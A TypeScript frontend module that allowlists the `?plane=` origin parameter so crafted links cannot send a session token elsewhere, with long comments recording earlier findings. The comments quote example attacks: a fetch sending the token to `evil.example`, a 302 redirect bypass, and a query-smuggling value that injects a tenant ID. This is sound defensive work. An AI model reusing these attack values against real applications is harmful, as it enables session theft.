/**
 * WHERE THE SESSION TOKEN MAY BE SENT — the `?plane=` allowlist.
 *
 * ═══════════════════════════════════════════════════════════════════════════
 * ⚠️ G386, 19 Sep 2026 — **THE THING THIS MODULE GUARDS IS NO LONGER
 *    EXFILTRABLE, AND THE MODULE STAYS. READ THIS BEFORE DELETING IT AND
 *    BEFORE QUOTING ITS TITLE.**
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * The ruling: *"Page script cannot read it, so the exfiltration class
 * `frontend/src/api/plane.ts`'s origin allowlist exists to guard STOPS BEING
 * POSSIBLE rather than being blocked — a crafted `?plane=` link has nothing to
 * steal. The allowlist and `redirect: 'error'` stay, as belt-and-braces rather
 * than as the only thing standing between a live token and a stranger."*
 *
 * **So the measured finding below is now unreproducible**: there is no token in
 * `sessionStorage`, `fetchRuns()` takes no `session`, and the clients send
 * `credentials: 'same-origin'`, which a browser refuses to honour toward any
 * other origin. Three independent things would have to be undone for a
 * `?plane=` link to reach a credential again.
 *
 * 🛑 WHAT THIS MODULE STILL BUYS, STATED PRECISELY SO IT IS NOT KEPT OUT OF
 * SENTIMENT — three things, none of them about the credential:
 *
 *   · **IT STOPS A CRAFTED LINK CHOOSING WHERE THE PRODUCT'S DATA COMES FROM.**
 *     A page reading its register from `evil.invalid` renders whatever that
 *     host returns, inside our chrome, to a signed-in operator. Nothing about
 *     an `HttpOnly` cookie prevents that; **the response is the attack, not the
 *     request.** Invariant 6's shape one layer out.
 *   · **IT KEEPS THE REFUSAL VISIBLE.** `refused` is drawn beside the
 *     connection light. Without it, a cross-origin plane would simply 401 —
 *     the cookie not being sent — and the operator would read *"no session"*
 *     and go looking for their login rather than at the link they followed.
 *   · **IT IS THE ONE PLACE A HOSTED PLANE WILL BE NAMED**, by someone editing
 *     this file, and never by whoever holds the link.
 *
 * ⚠️ AND THE SENTENCES BELOW ARE KEPT AS THE HISTORY THEY ARE. They record a
 * live finding that was real when measured, and the repair they describe is
 * still in the tree.
 *
 * ┌─ 🛑 THIS MODULE EXISTS BECAUSE `?plane=` IS NOT CONFIGURATION ─────────────┐
 * │ It decides the DESTINATION OF A CREDENTIAL.                                │
 * │                                                                            │
 * │ `frontend/src/api/runs.ts` attaches `X-Session: <token>` to whatever host  │
 * │ the origin it is handed resolves to. `main.tsx` used to read that origin   │
 * │ straight out of `location.search` with no validation, under a comment      │
 * │ reading "Configuration, not identity — so a query parameter is fine". That │
 * │ sentence is true of the ORIGIN and false of what the origin does to the    │
 * │ CREDENTIAL, and it is the sentence a reader would have trusted.            │
 * │                                                                            │
 * │ Measured before the repair: `fetchRuns({origin:'https://evil.example',     │
 * │ session:'…'})` issues `GET https://evil.example/v1/runs` with the token in │
 * │ the headers. One crafted link exfiltrates a live session from any tab that │
 * │ holds one, with no user interaction — the token sits in `sessionStorage`   │
 * │ under a fixed key and the read fires on mount.                             │
 * └────────────────────────────────────────────────────────────────────────────┘
 *
 * ┌─ ⚠️ AN ALLOWLIST A REDIRECT COULD LEAVE IS NOT AN ALLOWLIST ───────────────┐
 * │ This module's title was true of the FIRST HOP ONLY, and the review that     │
 * │ found it measured the gap rather than arguing it: two loopback servers, a   │
 * │ permitted origin answering `302` to an arbitrary one, and the second server │
 * │ logged `x-session: <live token>`. Fetch strips `Authorization`, `Cookie`    │
 * │ and `Proxy-Authorization` across an origin change and nothing else, and     │
 * │ `X-Session` is a custom header.                                            │
 * │                                                                            │
 * │ The repair is NOT here — an allowlist cannot see a response. It is          │
 * │ `redirect: 'error'` in `frontend/src/api/runs.ts`'s `readJson`, which       │
 * │ argues it at the point where the token is attached. This note exists so the │
 * │ title above is read as the claim it actually supports.                      │
 * └────────────────────────────────────────────────────────────────────────────┘
 *
 * ⚠️ IT IS ITS OWN MODULE, AND A `.ts` ONE, ON PURPOSE. `main.tsx` is JSX and no
 * test in this repository can load it — node strips types but does not transform
 * JSX — so a guard living there would be a guard nothing witnesses. Everything
 * here is a pure function of a query string, which is why
 * `tests/http/register-consumes-runs.test.ts` can assert it directly, including
 * against the exact hostile values that were found live.
 */

/**
 * The plane's origin when there is no page to ask — `npm run dev:plane`'s bind
 * address, and the one `tests/e2e/single-origin.ts` deliberately serves on.
 *
 * ⚠️ IT IS NO LONGER `DEFAULT_ORIGIN` AND THE RENAME IS THE POINT: this is the
 * FALLBACK, reached only when no browser is present. See `browserOrigin()`.
 */
export const LOCAL_PLANE_ORIGIN = 'http://127.0.0.1:8080'

/**
 * ═══════════════════════════════════════════════════════════════════════════
 * 🛑 G991, 20 Sep 2026 — **THE DEPLOYED BUNDLE USED TO CALL `localhost`.**
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * ⚠️ THIS CONSTANT WAS `export const DEFAULT_ORIGIN = 'http://127.0.0.1:8080'`
 * AND THE LINE IS CORRECTED RATHER THAN DELETED, because it is the sentence
 * `tests/e2e/single-origin.ts`, `infra/lib/edge-stack.ts` and
 * `docs/build/deploy-handoff.md` §5.4 all quote. Under G293 the bundle is
 * served by CloudFront and the data plane is a SECOND ORIGIN on the SAME
 * distribution behind `/v1/*` — so **the production plane origin is the page's
 * own origin**, and a bundle shipped with the old constant asked every
 * operator's laptop for the register.
 *
 * 🛑 AND THE OBVIOUS REPAIR — a bare relative `'/v1'`, which `deploy-handoff`
 * §5.4 words as *"make the default relative"* — IS REFUSED, MEASURED RATHER
 * THAN ARGUED. `planeEndpoint()` in `frontend/src/api/runs.ts` does
 * `new URL(origin)` and REFUSES a value that is not a URL, deliberately:
 * *"it is configuration, but it is also the destination of the session token,
 * so it is parsed rather than pasted."* `new URL('/v1')` and `new URL('')`
 * both throw. **The page's own origin IS the relative answer, spelled
 * absolutely** — `location.origin` is *"https://ten-acme.us-west-2.
 * reconcileai.app"*, a same-origin destination that parses. The ruling's
 * intent is honoured and its literal spelling is not, and that is said here
 * rather than left as a silent divergence.
 *
 * 🛑 THE SECOND REASON THIS IS A FUNCTION AND NOT A BARE `location.origin`:
 * **THE GATE RUNS THIS MODULE UNDER PLAIN NODE, WHERE `typeof location` IS
 * `undefined`.** `tests/http/register-consumes-runs.test.ts` imports it
 * directly — that is the whole reason it is a `.ts` module of its own rather
 * than a function inside `main.tsx`, as the block above says — so a module-scope
 * browser-global read is a **`ReferenceError` at IMPORT**, and the importer
 * reports it as *"`frontend/src/api/plane.ts` did not load"*. **Measured:
 * replacing the line below with `window.location.origin` turns that suite from
 * 26 pass / 0 fail into 19 pass / 7 fail**, every failure the same
 * `window is not defined`.
 *
 * ⚠️ **AND ONE CLAIM THAT WAS PUT TO THIS SLICE AND DOES NOT REPRODUCE, WRITTEN
 * DOWN RATHER THAN REPEATED: `npm run build:frontend` DOES NOT FAIL ON IT.**
 * The expectation was that the SSR prerender would throw, since it runs under
 * node with no `location`. It does not, because **this module is not in the
 * prerender's import graph at all** — `frontend/src/prerender.tsx` reaches
 * `Shell`, `Specimen`, `ChromeBar`, `routes/screens` and `illustrative`, and
 * none of them reaches `api/plane.ts`; `main.tsx` does, and the prerender does
 * not import `main.tsx`. Verified by running that stage under the mutation:
 * it built both bundles and prerendered both pages, EXIT 0. **The guard is
 * still required — the suite above is proof enough — and the reason given for
 * it has to be the true one, or the next reader deletes it after checking the
 * false one.**
 *
 * ⚠️ AND `location.origin` IS THE STRING `"null"` ON A `file://` OR SANDBOXED
 * DOCUMENT, which is not a hypothetical here: `tests/design/` loads the built
 * pages over `file://`. `"null"` is not a URL either, so it is refused by the
 * same parse the hostile values below are refused by, rather than by a special
 * case. A non-`http(s)` scheme is refused for the same reason — the session
 * cookie is `Secure`-attributed and a `file:` or `blob:` origin is not a place
 * a plane lives.
 *
 * 🛑 THIS IS NOT A WIDENING OF THE ALLOW-LIST AND THE DISTINCTION MATTERS:
 * **the page's own origin is where the browser already is.** Every byte of
 * this application came from it, the session cookie is `__Host-`-prefixed to
 * it, and `credentials: 'same-origin'` will send that cookie to it and to
 * nothing else. An attacker who can choose it has already replaced the page.
 * **`https://*.reconcileai.app` is deliberately NOT added** — `edge-stack.ts`
 * says so in as many words — because naming a hosted origin would put a
 * SECOND destination in reach of `?plane=`, which is exactly what the
 * allow-list exists to prevent.
 */
/**
 * The DECISION, split out from the READ so a test can drive every value a
 * browser can produce — including the ones no browser here will produce on
 * demand.
 *
 * 🛑 THIS SPLIT IS THE WHOLE REASON THE RULE IS WITNESSED RATHER THAN ASSERTED.
 * `location` is not settable from a test under node, and the one place a real
 * browser meets this code (`tests/e2e/browser-login.test.ts`) serves the page
 * on `http://127.0.0.1:8080` — the SAME value the node fallback produces — so a
 * browser-driven assertion cannot tell the two apart and `"null"` on a
 * `file://` document cannot be reached from either. A pure function of the raw
 * string can be asked all of it, which is `model/field-path.ts`'s one-parse-seam
 * shape applied to a browser global.
 *
 * @param raw what `location.origin` yielded, or `undefined` where there is none.
 */
export function permittedPageOrigin(raw: unknown): string | null {
  if (typeof raw !== 'string' || raw === '') return null
  let parsed: URL
  try {
    parsed = new URL(raw)
  } catch {
    /* `"null"`: a `file://` document, a sandboxed iframe, an opaque origin.
       Refused by the same parse the hostile `?plane=` values are refused by,
       rather than by a special case for one spelling. */
    return null
  }
  /* A plane speaks HTTP. `file:`, `blob:` and `data:` are not places one lives,
     and the session cookie is `Secure`-attributed besides. */
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null
  return parsed.origin
}

function browserOrigin(): string | null {
  /* `typeof` on a bare global is the one read that cannot throw when the
     global is absent — `location.origin` inside a `try` would still be a
     `ReferenceError` under node, caught, and therefore indistinguishable from
     a hostile value. */
  if (typeof location === 'undefined') return null
  return permittedPageOrigin(location.origin)
}

/**
 * The plane's origin when `?plane=` names nothing permitted: the page's own
 * origin in a browser, and the local plane everywhere else.
 */
export const DEFAULT_ORIGIN: string = browserOrigin() ?? LOCAL_PLANE_ORIGIN

/**
 * The two spellings of the local data plane `npm run dev:plane` binds, the two
 * Vite dev-server spellings G226 added — and, in a browser, THE PAGE'S OWN
 * ORIGIN.
 *
 * ⚠️ THE SENTENCE THAT STOOD HERE READ *"THERE IS NO HOSTED PLANE TO NAME AND
 * THAT IS NOT AN OVERSIGHT: no AWS resource has been created. When one exists
 * it is added HERE, deliberately, by someone editing this file — and never by
 * whoever holds the link."* **ITS PREMISE WENT FALSE ON 18 Sep 2026** — nine
 * stacks are live — and it is corrected rather than deleted because it is the
 * sentence `tests/http/register-consumes-runs.test.ts` quotes.
 *
 * **The hosted plane is still not named, and that is now a DECISION rather
 * than a fact about AWS**: under G293 it is not a separate origin at all. The
 * clause that survives unchanged is the important one — **a hosted origin is
 * never added by whoever holds the link**, and `browserOrigin()` is not a
 * counter-example, because it reads where the page already is rather than
 * anything in the URL a visitor was handed.
 */
export const PERMITTED_ORIGINS: readonly string[] = [
  /* ⚠️ `DEFAULT_ORIGIN` RATHER THAN A SECOND `browserOrigin()` CALL, AND IT IS
     NOT A TIDINESS POINT: two calls are two reads of a mutable global, and the
     shape where the fallback is permitted and the default is not — or the
     reverse — is one `location` assignment away. One value, read once.
     `LOCAL_PLANE_ORIGIN` is already spelled below, so in node this entry is a
     duplicate of an entry that follows, which `includes()` does not care about
     and which is cheaper than a de-duplication nobody can see the effect of. */
  DEFAULT_ORIGIN,
  'http://127.0.0.1:8080',
  'http://localhost:8080',
  /*
   * G226's proxy origins — the VITE DEV SERVER'S OWN, added 19 Sep 2026 when the
   * ruling was applied. A request to `http://localhost:5173/v1/runs` is
   * same-origin, so no preflight is made and no `OPTIONS` need exist; Vite
   * forwards it to the plane. The token goes to the page's own origin, which is
   * the one destination it is always already at.
   *
   * ⚠️ These are added HERE, by hand, exactly as the note above requires — and
   * they are DEV SERVER ports, not plane ports. There is still no hosted plane
   * to name.
   */
  'http://127.0.0.1:5173',
  'http://localhost:5173',
]

export interface Plane {
  /** Where the read goes, and where the session token is therefore sent. */
  readonly origin: string
  /** Why the requested plane was refused, or `null` if nothing was refused. */
  readonly refused: string | null
}

/**
 * ⚠️ COMPARED AS A PARSED ORIGIN, NEVER AS A STRING. `'http://127.0.0.1:8080'`,
 * `'http://127.0.0.1:8080/'` and `'http://127.0.0.1:8080/../'` are one
 * destination and three strings; `'http://127.0.0.1:8080.evil.test'` is a
 * different destination that a `startsWith` accepts and
 * `'https://127.0.0.1:8080'` is a different destination that a host comparison
 * accepts. `URL.origin` is what knows the difference — scheme, host AND port —
 * so `URL` is what decides.
 *
 * 🛑 A `search` OR A `hash` IS REFUSED OUTRIGHT RATHER THAN STRIPPED. `runs.ts`
 * resolves its path against this value, and an origin carrying a query is the
 * shape that smuggles a tenant onto the wire —
 * `?plane=http://127.0.0.1:8080/v1/runs?tenantId=ten_globex&pad=` was a live
 * finding, and it produced a correctly-addressed request with a tenant in the
 * query. Stripping silently would leave the caller believing the value was
 * honoured; refusing names what was wrong. `runs.ts` refuses the same shape
 * again at the point of use, because a guard that exists only at the caller
 * stops existing the moment a second caller appears.
 *
 * 🛑 AND A REFUSAL IS NEVER SILENT. It falls back to `DEFAULT_ORIGIN` AND
 * returns the reason, which `main.tsx` draws in the plane word beside the
 * connection light. A control that refuses without saying it refused teaches
 * people the parameter is broken, and the next person "fixes" it by deleting
 * the guard.
 */
export function planeFrom(search: string): Plane {
  const asked = new URLSearchParams(search).get('plane')
  if (asked === null || asked === '') return { origin: DEFAULT_ORIGIN, refused: null }

  let parsed: URL
  try {
    parsed = new URL(asked)
  } catch {
    return { origin: DEFAULT_ORIGIN, refused: `\`?plane=\` is not a URL — the session token is not sent` }
  }
  if (parsed.search !== '' || parsed.hash !== '') {
    return {
      origin: DEFAULT_ORIGIN,
      refused: '`?plane=` carries a query or a fragment, which a plane origin never does',
    }
  }
  if (!PERMITTED_ORIGINS.includes(parsed.origin)) {
    return {
      origin: DEFAULT_ORIGIN,
      refused: `${parsed.origin} is not a permitted plane — the session token is not sent there`,
    }
  }
  return { origin: parsed.origin, refused: null }
}
